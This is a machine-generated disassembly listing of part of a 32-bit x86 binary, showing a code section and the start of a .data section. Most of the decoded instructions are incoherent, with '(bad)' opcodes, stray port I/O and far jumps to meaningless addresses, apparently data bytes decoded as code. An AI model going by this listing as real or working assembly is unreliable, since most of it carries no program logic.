  41c806:	dec    esp
  41c807:	dec    ebx
  41c808:	dec    esp
  41c809:	pop    esp
  41c80a:	jbe    0x41c7cf
  41c80c:	mov    ds:0xead5c659,eax
  41c811:	pusha  
  41c812:	cmc    
  41c813:	stos   DWORD PTR es:[edi],eax
  41c814:	je     0x41c809
  41c816:	je     0x41c885
  41c818:	and    bl,BYTE PTR [edi]
  41c81a:	mov    esp,0xa1204b50
  41c81f:	mov    ds:0xd47ac16a,eax
  41c824:	(bad)  
  41c825:	pop    ds
  41c826:	jp     0x41c870
  41c828:	sub    DWORD PTR [ebp-0x23b7f168],edi
  41c82e:	adc    al,0x41
  41c830:	mov    esp,DWORD PTR [eax]
  41c832:	outs   dx,BYTE PTR ds:[esi]
  41c833:	sbb    esi,DWORD PTR [edx]
  41c835:	jp     0x41c800
  41c837:	sar    BYTE PTR [ebx-0x5e],0xf7
  41c83b:	pop    edx
  41c83c:	pop    esi
  41c83d:	test   eax,0xf57a6418
  41c842:	push   ds
  41c843:	inc    esi
  41c844:	shld   ebp,edi,0x68
  41c848:	push   edx
  41c849:	jl     0x41c882
  41c84b:	mov    eax,0x6945d227
  41c850:	xchg   ebx,eax
  41c851:	dec    ebx
  41c852:	mov    BYTE PTR [edx+0x776c0011],ah
  41c858:	int    0xec
  41c85a:	mov    BYTE PTR [edi],bh
  41c85c:	ret    
  41c85d:	arpl   WORD PTR [edx+0x770c361e],di
  41c863:	clc    
  41c864:	pop    ebp
  41c865:	mov    edx,0x88fabc0
  41c86a:	js     0x41c800
  41c86c:	mov    eax,ds:0xb6917602
  41c871:	add    al,0x75
  41c873:	cmp    BYTE PTR [eax],ch
  41c875:	out    dx,eax
  41c876:	lds    eax,FWORD PTR [edx+0x68]
  41c879:	xchg   DWORD PTR [eax-0x570ad0f5],esp
  41c87f:	jmp    0x412a:0x6280d01c
  41c886:	lock inc esp
  41c888:	mov    edi,0x81762016
  41c88d:	fucomi st,st(4)
  41c88f:	cmp    ah,BYTE PTR ds:0x3cd104cb
  41c895:	or     eax,0xf950bb1e
  41c89b:	sub    esp,DWORD PTR [esi+ebx*8]
  41c89e:	mov    bl,0xe6
  41c8a0:	xchg   esi,eax
  41c8a1:	shl    BYTE PTR [ebp-0x4e3f0cc5],cl
  41c8a7:	enter  0x6945,0xf4
  41c8ab:	inc    esi
  41c8ac:	push   ds
  41c8ad:	mov    ds:0x9ad4c99d,eax
  41c8b2:	adc    bl,ch
  41c8b4:	leave  
  41c8b5:	pop    esi
  41c8b6:	shl    bh,cl
  41c8b8:	in     al,0x47
  41c8ba:	sub    al,0xec
  41c8bc:	hlt    
  41c8bd:	leave  
  41c8be:	xchg   edi,eax
  41c8bf:	jno    0x41c89f
  41c8c1:	xchg   cx,ax
  41c8c3:	jg     0x41c8cc
  41c8c5:	pop    ss
  41c8c6:	mov    WORD PTR [esi+eax*8+0xf],?
  41c8ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8cb:	mov    cs,WORD PTR [ebp-0x6a]
  41c8ce:	push   edx
  41c8cf:	scas   eax,DWORD PTR es:[edi]
  41c8d0:	xchg   dl,dl
  41c8d2:	xchg   esi,eax
  41c8d3:	jae    0x41c942
  41c8d5:	aaa    
  41c8d6:	push   es
  41c8d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8d8:	aas    
  41c8d9:	bound  edi,QWORD PTR [eax+0x21]
  41c8dc:	enter  0x8cf4,0xac
  41c8e0:	rol    esp,0x9d
  41c8e3:	outs   dx,BYTE PTR ds:[esi]
  41c8e4:	lahf   
  41c8e5:	aas    
  41c8e6:	out    dx,eax
  41c8e7:	jno    0x41c8a1
  41c8e9:	not    DWORD PTR [esi]
  41c8eb:	jo     0x41c912
  41c8ed:	out    dx,al
  41c8ee:	dec    edx
  41c8ef:	inc    ebx
  41c8f0:	add    ebx,DWORD PTR [edx+ebx*1]
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	mov    ecx,gs
  41c911:	add    al,0x74
  41c913:	sbb    bh,dh
  41c915:	jg     0x41c98f
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c939
  41c91c:	mov    dh,0x4c
  41c91e:	cmp    cl,BYTE PTR [ecx]
  41c920:	(bad)  
  41c921:	adc    al,dh
  41c923:	xchg   ecx,eax
  41c924:	test   al,0xaa
  41c926:	or     BYTE PTR [esi+0x7324be7d],ah
  41c92c:	mov    ah,0x9a
  41c92e:	shl    DWORD PTR [eax+0x0],1
  41c931:	(bad)  
  41c933:	pop    edi
  41c934:	aad    0x95
  41c936:	and    al,0xdd
  41c938:	inc    edx
  41c939:	test   DWORD PTR [eax+0x65aab7e2],edi
  41c93f:	dec    ebp
  41c940:	mov    eax,ds:0xa768a7cb
  41c945:	sbb    BYTE PTR [eax],ah
  41c947:	sub    eax,0xb7f9637b
  41c94c:	sbb    al,0xd7
  41c94e:	inc    esp
  41c94f:	test   ecx,ebp
  41c951:	fdiv   QWORD PTR [ecx]
  41c953:	mov    ch,0x5c
  41c955:	push   0xffffff8f
  41c957:	add    al,0xf9
  41c959:	rcr    DWORD PTR [ecx],cl
  41c95b:	xchg   DWORD PTR [edi-0x6490017b],ecx
  41c961:	jnp    0x41c918
  41c963:	outs   dx,DWORD PTR ds:[esi]
  41c964:	cmp    bl,BYTE PTR [eax+0x5cb77261]
  41c96a:	daa    
  41c96b:	ins    DWORD PTR es:[edi],dx
  41c96c:	cmp    DWORD PTR [esi+0xd8324b9],0x250716da
  41c976:	push   cs
  41c977:	(bad)  
  41c978:	jo     0x41c9a7
  41c97a:	xchg   edi,eax
  41c97b:	std    
  41c97c:	jnp    0x41c96d
  41c97e:	pop    esi
  41c97f:	test   al,0x1
  41c981:	pop    eax
  41c982:	mov    ebx,0x1e53f3a8
  41c987:	xchg   al,bl
  41c989:	es jae 0x41c957
  41c98c:	ficom  DWORD PTR [eax]
  41c98e:	inc    edx
  41c98f:	ret    0x5aae
  41c992:	popf   
  41c993:	in     al,dx
  41c994:	push   esp
  41c995:	push   0xf8077263
  41c99a:	sti    
  41c99b:	add    DWORD PTR [esi+0x5d83841d],0xf
  41c9a2:	sbb    ebp,DWORD PTR [ecx-0x6ea9ce0a]
  41c9a8:	call   0x1d91b289
  41c9ad:	adc    BYTE PTR [edx+eiz*2+0x6da2ecd3],dl
  41c9b4:	out    0xc2,eax
  41c9b6:	sbb    edx,DWORD PTR [edi]
  41c9b8:	push   eax
  41c9b9:	xchg   ebp,eax
  41c9ba:	popf   
  41c9bb:	aam    0xe
  41c9bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9be:	stos   DWORD PTR es:[edi],eax
  41c9bf:	sar    ebp,0x8c
  41c9c2:	mov    edi,0x6efd330f
  41c9c7:	inc    edx
  41c9c8:	xor    cl,BYTE PTR [eax+0x4449b6a]
  41c9ce:	and    BYTE PTR ds:0x895e35c6,al
  41c9d4:	mov    al,0x65
  41c9d6:	jl     0x41c98d
  41c9d8:	add    dh,al
  41c9da:	mov    ah,0xaf
  41c9dc:	repnz in al,0x59
  41c9df:	mov    cl,0x9f
  41c9e1:	mov    dl,cl
  41c9e3:	ret    
  41c9e4:	stos   DWORD PTR es:[edi],eax
  41c9e5:	imul   ecx,DWORD PTR [ecx+0x77],0xa9817b2e
  41c9ec:	test   DWORD PTR [ecx+edi*4-0x2c],esi
  41c9f0:	aad    0x1b
  41c9f2:	nop
  41c9f3:	bnd jnp 0x41c9c9
  41c9f6:	fdivrp st(1),st
  41c9f8:	mov    esi,0x6f2373ca
  41c9fd:	cmc    
  41c9fe:	(bad)  
  41c9ff:	mov    DWORD PTR [edx],0x4ecf6d30
  41ca05:	sbb    ebp,DWORD PTR [ecx-0x555c321a]
  41ca0b:	lods   eax,DWORD PTR ds:[esi]
  41ca0c:	dec    edi
  41ca0d:	add    al,0xc5
  41ca0f:	(bad)  
  41ca11:	adc    DWORD PTR [ebp+0x2e],0xffffffe8
  41ca15:	repnz mov es:0x2bd9adaf,eax
  41ca1c:	adc    eax,0x8fe73d19
  41ca21:	jle    0x41ca53
  41ca23:	dec    esp
  41ca24:	dec    ecx
  41ca25:	scas   al,BYTE PTR es:[edi]
  41ca26:	out    dx,eax
  41ca27:	dec    ebx
  41ca28:	in     eax,0xfb
  41ca2a:	sahf   
  41ca2b:	fst    QWORD PTR [ebp-0x78]
  41ca2e:	pop    esi
  41ca2f:	sbb    eax,0x5ea649e5
  41ca34:	arpl   WORD PTR [edx],bp
  41ca36:	js     0x41ca70
  41ca38:	jg     0x41caa9
  41ca3a:	and    dl,ah
  41ca3c:	cld    
  41ca3d:	jbe    0x41cab1
  41ca3f:	or     DWORD PTR [edx+eax*4+0x59da82f3],0xb5d32ed2
  41ca4a:	arpl   cx,bp
  41ca4c:	mov    dl,0x24
  41ca4e:	ss std 
  41ca50:	(bad)  
  41ca51:	ins    DWORD PTR es:[edi],dx
  41ca52:	cmc    
  41ca53:	lods   eax,DWORD PTR ds:[esi]
  41ca54:	out    0x27,eax
  41ca56:	adc    BYTE PTR [edx-0x3a9597a9],0x4d
  41ca5d:	mov    dl,0x91
  41ca5f:	aaa    
  41ca60:	addr16 loope 0x41caba
  41ca63:	xor    BYTE PTR ds:0x6519f0e6,cl
  41ca69:	mov    bh,0x3a
  41ca6b:	jns    0x41ca3e
  41ca6d:	inc    ebp
  41ca6e:	cld    
  41ca6f:	mov    bh,0xed
  41ca71:	enter  0x9c00,0x5d
  41ca75:	xchg   esi,eax
  41ca76:	iret   
  41ca77:	cli    
  41ca78:	xor    eax,0xc5cc43e0
  41ca7d:	push   ds
  41ca7e:	xor    al,0xb5
  41ca80:	ja     0x41ca1c
  41ca82:	xor    eax,0xb2102536
  41ca87:	aas    
  41ca88:	ret    0x6bf8
  41ca8b:	mov    ecx,0xe225d349
  41ca90:	stos   BYTE PTR es:[edi],al
  41ca91:	and    eax,0xb5f5f374
  41ca96:	mov    edx,0x608fa36
  41ca9b:	fucomp st(1)
  41ca9e:	or     bh,BYTE PTR [edx*4+0x53c1ce2d]
  41caa5:	stos   DWORD PTR es:[edi],eax
  41caa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caa7:	or     eax,0xeafe79b0
  41caac:	xor    esi,DWORD PTR [eax+edx*2+0x26a7d3d3]
  41cab3:	or     ebp,DWORD PTR [edx-0x67b576a4]
  41cab9:	es in  al,0x78
  41cabc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cabd:	fistp  QWORD PTR [edx]
  41cabf:	jne    0x41ca70
  41cac1:	push   esi
  41cac2:	or     BYTE PTR [ebp+0x75],0xff
  41cac6:	stos   DWORD PTR es:[edi],eax
  41cac7:	out    dx,al
  41cac8:	iret   
  41cac9:	xchg   esi,eax
  41caca:	icebp  
  41cacb:	adc    DWORD PTR [esi+0x50f50d79],ebp
  41cad1:	xchg   ebp,eax
  41cad2:	mov    bl,0x10
  41cad4:	jo     0x41ca81
  41cad6:	pop    ebp
  41cad7:	and    eax,0xafa3ec7f
  41cadc:	pop    esi
  41cadd:	push   ecx
  41cade:	inc    ecx
  41cadf:	sbb    DWORD PTR [esi],ecx
  41cae1:	gs je  0x41cb0a
  41cae4:	mov    eax,ds:0xf542fb10
  41cae9:	jne    0x41cb19
  41caeb:	popa   
  41caec:	xchg   ebp,eax
  41caed:	fimul  WORD PTR [edi]
  41caef:	jp     0x41caf6
  41caf1:	xor    ah,BYTE PTR [esi]
  41caf3:	scas   eax,DWORD PTR es:[edi]
  41caf4:	ret    0x44ed
  41caf7:	call   DWORD PTR [edi+edi*4-0x1c]
  41cafb:	mov    ecx,0x5478e725
  41cb00:	mov    al,0x1
  41cb02:	stos   BYTE PTR es:[edi],al
  41cb03:	(bad)  
  41cb04:	mov    ah,0xe
  41cb06:	gs idiv esp
  41cb09:	clc    
  41cb0a:	xchg   ebp,eax
  41cb0b:	inc    esp
  41cb0c:	out    dx,al
  41cb0d:	(bad)  
  41cb0e:	jae    0x41cab0
  41cb10:	push   ecx
  41cb11:	mov    ds:0x872f9beb,eax
  41cb16:	xor    DWORD PTR ds:0x81dd85a7,ecx
  41cb1c:	add    DWORD PTR [esi],ecx
  41cb1e:	sti    
  41cb1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb20:	sbb    al,0x8e
  41cb22:	pop    ebx
  41cb23:	mov    edx,0xbffa44ca
  41cb28:	shl    ebp,1
  41cb2a:	test   DWORD PTR [edx+ecx*1],ecx
  41cb2d:	fcmovnbe st,st(1)
  41cb2f:	jo     0x41cb4b
  41cb31:	rol    BYTE PTR [ebp+0x230e95e],1
  41cb37:	add    BYTE PTR [eax],al
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x228b6037
  41cb47:	mov    esp,?
  41cb49:	xor    ch,dh
  41cb4b:	jg     0x41cbc5
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cbcb
  41cb52:	arpl   cx,ax
  41cb54:	call   0xaf66bfd2
  41cb59:	test   DWORD PTR ds:0x29b89b8c,0x89b3e4c7
  41cb63:	int    0xc4
  41cb65:	push   ebx
  41cb66:	ins    DWORD PTR es:[edi],dx
  41cb67:	ret    0x4aee
  41cb6a:	not    BYTE PTR [edi-0x2cd01042]
  41cb70:	ja     0x41cb7b
  41cb72:	adc    eax,0xe1b09352
  41cb77:	int    0xb5
  41cb79:	out    0x92,al
  41cb7b:	test   BYTE PTR [edi],dh
  41cb7d:	inc    ebx
  41cb7e:	xchg   BYTE PTR [ecx+eiz*2],ch
  41cb81:	xlat   BYTE PTR ds:[ebx]
  41cb82:	pusha  
  41cb83:	retf   0x3ad5
  41cb86:	call   0xde6d2c99
  41cb8b:	lods   al,BYTE PTR ds:[esi]
  41cb8c:	inc    edi
  41cb8d:	xor    DWORD PTR [esp+esi*2+0x74],esp
  41cb91:	mov    bl,0x14
  41cb93:	mov    ecx,0x56ac6a72
  41cb98:	add    esi,eax
  41cb9a:	sti    
  41cb9b:	aas    
  41cb9c:	xchg   DWORD PTR [edi-0x5d9ee7ba],ebx
  41cba2:	and    eax,0x61221180
  41cba7:	std    
  41cba8:	daa    
  41cba9:	push   ss
  41cbaa:	push   ebx
  41cbab:	dec    ecx
  41cbac:	ret    0x4117
  41cbaf:	mov    al,ds:0x49bd7f9e
  41cbb4:	stos   DWORD PTR es:[edi],eax
  41cbb5:	(bad)  
  41cbb6:	and    DWORD PTR [ebp+ebp*8+0x46da57a],esp
  41cbbd:	sub    al,0x2b
  41cbbf:	xor    bh,BYTE PTR [ebp+0x3c]
  41cbc2:	out    0x9c,eax
  41cbc4:	sbb    BYTE PTR [esi],dh
  41cbc6:	aas    
  41cbc7:	test   BYTE PTR [edx],bh
  41cbc9:	pop    edx
  41cbca:	(bad)  
  41cbcb:	pop    ds
  41cbcc:	imul   bl
  41cbce:	mov    ecx,0xda43e55f
  41cbd3:	inc    edx
  41cbd4:	push   ds
  41cbd5:	or     eax,0xbc2b0d4e
  41cbda:	jbe    0x41cb79
  41cbdc:	out    0x75,al
  41cbde:	mov    WORD PTR [ecx-0x38],?
  41cbe1:	mov    esi,0xef0a1e91
  41cbe6:	dec    edx
  41cbe7:	fst    DWORD PTR gs:[ebp+0x50]
  41cbeb:	shr    eax,cl
  41cbed:	stos   BYTE PTR es:[edi],al
  41cbee:	les    esi,FWORD PTR [esi+edx*8+0x24]
  41cbf2:	pop    es
  41cbf3:	addr16 inc eax
  41cbf5:	mov    bl,ah
  41cbf7:	dec    edx
  41cbf8:	test   bl,0x7a
  41cbfb:	pushf  
  41cbfc:	or     bl,al
  41cbfe:	test   BYTE PTR [ebx-0x3a],dh
  41cc01:	mov    WORD PTR [ebx],?
  41cc03:	jae    0x41cbe0
  41cc05:	sub    dh,BYTE PTR ds:0x4500d56c
  41cc0b:	mov    esp,0xd775699c
  41cc10:	pop    edx
  41cc11:	sub    al,bh
  41cc13:	das    
  41cc14:	xchg   esp,eax
  41cc15:	cmp    eax,0x9e5ec500
  41cc1a:	test   BYTE PTR [esi+0x68ffc894],bh
  41cc20:	fdivr  QWORD PTR [eax+esi*4]
  41cc23:	sbb    esi,DWORD PTR [ecx+eiz*8]
  41cc26:	ret    
  41cc27:	add    bl,BYTE PTR [edi-0x59e55f65]
  41cc2d:	push   edx
  41cc2e:	ins    DWORD PTR es:[edi],dx
  41cc2f:	enter  0x147b,0x6e
  41cc33:	lods   eax,DWORD PTR ds:[esi]
  41cc34:	or     DWORD PTR [ebx-0x23],esi
  41cc37:	mov    bl,BYTE PTR [esi+edi*1+0x7b1213be]
  41cc3e:	imul   ebp,DWORD PTR [ebx-0x371236f5],0x8b222ed4
  41cc48:	push   ebp
  41cc49:	cld    
  41cc4a:	adc    al,0xb5
  41cc4c:	xor    BYTE PTR [ecx-0x65],dl
  41cc4f:	dec    edx
  41cc50:	popa   
  41cc51:	fucomi st,st(1)
  41cc53:	or     DWORD PTR [edi],ecx
  41cc55:	nop
  41cc56:	xor    DWORD PTR [ebx],eax
  41cc58:	add    bh,bh
  41cc5a:	jae    0x41cc13
  41cc5c:	mov    ah,0x4a
  41cc5e:	jnp    0x41ccca
  41cc60:	mov    eax,ds:0x29afb31a
  41cc65:	mov    al,0xa6
  41cc67:	jge    0x41cc6e
  41cc69:	bound  edx,QWORD PTR [eax-0x4c]
  41cc6c:	jp     0x41cc8e
  41cc6e:	pushf  
  41cc6f:	jmp    0x86236a30
  41cc74:	pop    ebp
  41cc75:	jb     0x41ccb4
  41cc77:	dec    eax
  41cc78:	xor    ch,bh
  41cc7a:	out    0x6f,eax
  41cc7c:	sbb    edx,eax
  41cc7e:	jge    0x41ccfe
  41cc80:	inc    esi
  41cc81:	stos   DWORD PTR es:[edi],eax
  41cc82:	xor    eax,0x81304c8d
  41cc87:	or     eax,0x342de5d1
  41cc8c:	(bad)  
  41cc8d:	mov    ch,0xb7
  41cc8f:	dec    ebp
  41cc90:	test   al,0xa5
  41cc92:	lock sbb ebp,DWORD PTR [eax-0x20311630]
  41cc99:	push   es
  41cc9a:	mov    cl,0xd3
  41cc9c:	inc    edi
  41cc9d:	mov    ebp,0xcb7f2e95
  41cca2:	out    dx,al
  41cca3:	or     DWORD PTR [ebx],0x16
  41cca6:	jbe    0x41ccaf
  41cca8:	(bad)
  41ccab:	inc    esi
  41ccac:	mov    gs,WORD PTR [edi-0x7863d36c]
  41ccb2:	add    al,0x91
  41ccb4:	pop    ss
  41ccb5:	add    al,0x44
  41ccb7:	push   edx
  41ccb8:	out    dx,eax
  41ccb9:	add    DWORD PTR [ecx-0x35e28204],esi
  41ccbf:	adc    cl,BYTE PTR [ebx-0x3565a771]
  41ccc5:	sub    eax,0x7153d27f
  41ccca:	pop    edx
  41cccc:	(bad)  
  41cccd:	sbb    al,BYTE PTR [ebp+ebp*4+0x32]
  41ccd1:	daa    
  41ccd2:	jle    0x41cce1
  41ccd4:	adc    al,0x9e
  41ccd6:	fisttp DWORD PTR [edx-0x4d]
  41ccd9:	push   ebp
  41ccda:	mov    ch,0xd4
  41ccdc:	xor    al,0x76
  41ccde:	cmp    bh,al
  41cce0:	push   ebx
  41cce1:	mov    WORD PTR [esi],fs
  41cce3:	shl    DWORD PTR [edx-0x179d099c],0xed
  41ccea:	in     eax,0xfa
  41ccec:	ret    
  41cced:	cs stos DWORD PTR es:[edi],eax
  41ccef:	ds repz test eax,0x5aa30e58
  41ccf6:	adc    al,0x98
  41ccf8:	in     al,0xbe
  41ccfa:	ds dec esp
  41ccfc:	call   0xa80:0x349aa5d1
  41cd03:	int    0xf4
  41cd05:	sbb    BYTE PTR ds:0xa3ad2b4d,0x19
  41cd0c:	jae    0x41cc99
  41cd0e:	data16 aam 0x5d
  41cd11:	imul   edi,DWORD PTR [esp+edi*2+0x5ccb6a6],0x775723e1
  41cd1c:	je     0x41ccf0
  41cd1e:	jb     0x41ccda
  41cd20:	ja     0x41cd87
  41cd22:	pop    ebp
  41cd23:	inc    eax
  41cd24:	mov    al,0xbb
  41cd26:	push   es
  41cd27:	cmp    al,ch
  41cd29:	jl     0x41cd25
  41cd2b:	jno    0x41cd9c
  41cd2d:	sub    eax,0xb38d0462
  41cd32:	int3   
  41cd33:	fwait
  41cd34:	popa   
  41cd35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd36:	mov    dh,0x5
  41cd38:	fiadd  WORD PTR [eax-0x10]
  41cd3b:	dec    esp
  41cd3c:	push   esi
  41cd3d:	idiv   bh
  41cd3f:	and    al,0xc7
  41cd41:	mov    dh,al
  41cd43:	ins    DWORD PTR es:[edi],dx
  41cd44:	inc    edx
  41cd45:	push   eax
  41cd46:	cmp    esi,ebx
  41cd48:	nop
  41cd49:	pop    es
  41cd4a:	ins    BYTE PTR es:[edi],dx
  41cd4b:	pop    ss
  41cd4c:	xchg   esp,eax
  41cd4d:	pop    esi
  41cd4e:	jmp    0x2a3497d4
  41cd53:	jmp    FWORD PTR [edx]
  41cd55:	inc    eax
  41cd56:	sar    BYTE PTR [ebx+0x11061440],cl
  41cd5c:	sahf   
  41cd5d:	or     BYTE PTR [edi],ah
  41cd5f:	mov    esp,0xb9a197a
  41cd64:	or     eax,0xb3984d3c
  41cd69:	pop    ebx
  41cd6a:	leave  
  41cd6b:	ret    0x10

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
